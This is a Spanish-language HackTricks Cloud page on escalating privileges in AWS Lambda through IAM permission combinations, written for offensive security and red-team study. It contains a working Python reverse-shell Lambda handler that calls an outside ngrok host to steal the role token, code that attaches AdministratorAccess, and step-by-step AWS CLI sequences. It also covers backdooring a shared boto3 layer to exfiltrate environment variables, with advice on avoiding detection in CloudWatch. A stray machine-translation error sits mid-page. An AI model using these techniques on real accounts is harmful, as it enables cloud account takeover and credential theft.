# AWS - Lambda Privesc

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## lambda

M√°s informaci√≥n sobre lambda en:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction`,** y **`lambda:InvokeFunction`** puede **escalar privilegios pasando un rol IAM existente a una nueva funci√≥n Lambda** que incluye c√≥digo para importar la biblioteca de AWS relevante a su lenguaje de programaci√≥n de elecci√≥n, y luego usarla para realizar acciones de su elecci√≥n. El c√≥digo podr√≠a ejecutarse invocando la funci√≥n a trav√©s de la API de AWS.

Un atacante podr√≠a abusar de esto para obtener un **rev shell y robar el token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
No hay contenido proporcionado para traducir aparte de la etiqueta de cierre de Markdown `{% endcode %}`. Por favor, proporcione el texto relevante que necesita ser traducido.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Tambi√©n podr√≠as **abusar de los permisos del rol lambda** desde la propia funci√≥n lambda.\
Si el rol lambda tuviera suficientes permisos, podr√≠as usarlo para otorgarte derechos de administrador:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**Impacto Potencial:** Escalada de privilegios directa al rol de servicio lambda arbitrario especificado.

{% hint style="danger" %}
Ten en cuenta que aunque pueda parecer interesante, **`lambda:InvokeAsync`** **no** permite por s√≠ solo **ejecutar `aws lambda invoke-async`**, tambi√©n necesitas `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como en el escenario anterior, puedes **otorgarte el permiso `lambda:InvokeFunction`** si tienes el permiso **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Privesc directo al rol de servicio lambda arbitrario especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction` y `lambda:CreateEventSourceMapping`** (y posiblemente `dynamodb:PutItem` y `dynamodb:CreateTable`), pero **sin** el permiso `lambda:InvokeFunction`, puede escalar privilegios **pasando un rol IAM existente a una nueva funci√≥n Lambda** que incluye c√≥digo para importar la biblioteca de AWS relevante a su lenguaje de programaci√≥n de elecci√≥n, luego usarla para realizar acciones de su elecci√≥n. Luego necesitar√≠an **crear una tabla de DynamoDB o usar una existente**, para **crear un mapeo de fuente de evento para la funci√≥n Lambda apuntando a esa tabla de DynamoDB**. Despu√©s necesitar√≠an poner un √≠tem en la tabla o esperar otro m√©todo para hacerlo para que la **funci√≥n Lambda sea invocada**.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Donde el **c√≥digo** en el archivo python **utilizar√≠a el rol objetivo**. Un ejemplo ser√≠a el mismo script utilizado en el m√©todo anterior.

Despu√©s de esto, el siguiente paso depende de **si se est√° utilizando DynamoDB** en el entorno actual de AWS. **Si** se est√° **utilizando**, todo lo que se necesita hacer es **crear el mapeo de fuente de evento** para la funci√≥n Lambda, pero si no, entonces el atacante necesitar√° **crear una tabla con transmisi√≥n habilitada** con el siguiente comando:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Despu√©s de este comando, el atacante **conectar√≠a la funci√≥n Lambda y la tabla DynamoDB** al **crear un mapeo de fuente de evento** con el siguiente comando:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Ahora que la funci√≥n Lambda y el stream est√°n conectados, el atacante puede **invocar la funci√≥n Lambda al activar el stream de DynamoDB**. Esto se puede hacer insertando un elemento en la tabla de DynamoDB, lo que activar√° el stream, utilizando el siguiente comando:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
En este punto, la funci√≥n Lambda ser√° invocada, y el atacante se convertir√° en administrador de la cuenta de AWS.

**Impacto Potencial:** Privesc directo al rol de servicio de lambda especificado.

### `lambda:AddPermission`

Un atacante con este permiso puede **otorgarse a s√≠ mismo (o a otros) cualquier permiso** (esto genera pol√≠ticas basadas en recursos para otorgar acceso al recurso):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impacto Potencial:** Privesc directo al rol de servicio de lambda utilizado otorgando permiso para modificar el c√≥digo y ejecutarlo.

### `lambda:AddLayerVersionPermission`

Un atacante con este permiso puede **otorgarse a s√≠ mismo (o a otros) el permiso `lambda:GetLayerVersion`**. Podr√≠a acceder a la capa y buscar vulnerabilidades o informaci√≥n sensible

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impacto Potencial:** Acceso potencial a informaci√≥n sensible.

### `lambda:UpdateFunctionCode`

Un atacante con el permiso **`lambda:UpdateFunctionCode`** podr√≠a **actualizar el c√≥digo en una funci√≥n Lambda existente con un rol de IAM adjunto** de modo que importar√≠a la biblioteca de AWS relevante en ese lenguaje de programaci√≥n y la usar√≠a para realizar acciones en nombre de ese rol. Luego tendr√≠an que **esperar a que sea invocada si no pudieran hacerlo directamente**, pero si ya existe, es probable que haya alguna manera de que sea invocada.
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
Donde el archivo **.zip asociado contiene c√≥digo que utiliza el rol de Lambda**. Un ejemplo podr√≠a incluir el fragmento de c√≥digo de m√©todos anteriores.

**Impacto Potencial:** Privesc directo al rol de servicio de lambda utilizado.

### `lambda:UpdateFunctionConfiguration`

#### Introducci√≥n

[**Capas de Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **c√≥digo** en tu funci√≥n lambda pero **almacen√°ndolo por separado**, de modo que el c√≥digo de la funci√≥n puede permanecer peque√±o y **varias funciones pueden compartir c√≥digo**.

Dentro de lambda puedes verificar las rutas desde donde se carga el c√≥digo de python con una funci√≥n como la siguiente:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
#### Explotaci√≥n

**Adjuntar una capa a una funci√≥n** solo requiere el permiso `lambda:UpdateFunctionConfiguration` y **las capas pueden compartirse entre cuentas**. Tambi√©n necesitar√≠amos saber **qu√© bibliotecas est√°n utilizando**, para poder sobrescribirlas correctamente, pero en este ejemplo, vamos a **suponer que la funci√≥n atacada est√° importando boto3**.

Para estar seguros, vamos a usar Pip para instalar la misma versi√≥n de la biblioteca boto3 del entorno de ejecuci√≥n de Lambda que estamos apuntando (Python 3.7), solo para que no haya nada diferente que pueda causar problemas en la funci√≥n objetivo. Ese entorno de ejecuci√≥n actualmente utiliza la versi√≥n 1.9.42 de boto3.

Con el siguiente c√≥digo, instalaremos la versi√≥n 1.9.42 de boto3 y sus dependencias en una carpeta local "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
A continuaci√≥n, abriremos `/lambda_layer/boto3/__init__.py` y a√±adiremos el c√≥digo malicioso. El payload que vamos a agregar se ve as√≠:

![](<../../../.gitbook/assets/image (26).png>)

`requests` se importa desde `botocore`. La funci√≥n exfiltrar√° las variables de entorno, y el bloque try-except y el timeout de 0.1 est√°n para asegurar que este c√≥digo no rompa nada.

{% hint style="info" %}
**Nota importante:** No deber√≠as usar `from botocore.vendored import requests` en pentests reales, porque se imprimir√° una ‚ÄúDeprecationWarning‚Äù en los registros de CloudWatch de esa funci√≥n, lo que probablemente provocar√° que un defensor te descubra.
{% endhint %}

Ahora, empaqueta ese c√≥digo en un **archivo ZIP** y **s√∫belo** a una **nueva capa de Lambda en la cuenta del ATACANTE**. Necesitar√°s crear primero una carpeta llamada ‚Äúpython‚Äù y poner tus bibliotecas all√≠ para que, una vez lo subamos a Lambda, el c√≥digo se encuentre en ‚Äú/opt/python/boto3‚Äù. Aseg√∫rate tambi√©n de que la capa sea compatible con Python 3.7 y que la **capa est√© en la misma regi√≥n que nuestra funci√≥n objetivo**. Una vez hecho esto, utilizaremos `lambda:AddLayerVersionPermission` para **hacer la capa p√∫blicamente accesible** para que nuestra cuenta objetivo pueda utilizarla. Usa tus credenciales personales de AWS para esta llamada a la API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ahora, con las **credenciales comprometidas** que tenemos, ejecutaremos el siguiente comando en nuestra funci√≥n Lambda objetivo "s3-getter", lo cual **adjuntar√° nuestra capa Lambda de cuenta cruzada**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
El siguiente paso ser√≠a **invocar la funci√≥n** nosotros mismos si podemos o esperar hasta que **se invoque** por medios normales, lo cual es el m√©todo m√°s seguro.

Una **forma m√°s sigilosa de explotar esta vulnerabilidad** se puede encontrar en:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto Potencial:** Privesc directo al rol de servicio de lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Quiz√°s con esos permisos seas capaz de crear una funci√≥n y ejecutarla llamando a la URL... pero no encontr√© una forma de probarlo, ¬°as√≠ que av√≠same si lo haces!

### Lambda MitM

Algunas lambdas van a **recibir informaci√≥n sensible de los usuarios en par√°metros.** Si obtienes RCE en una de ellas, puedes exfiltrar la informaci√≥n que otros usuarios est√°n enviando, compru√©balo en:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Aprende hacking de AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
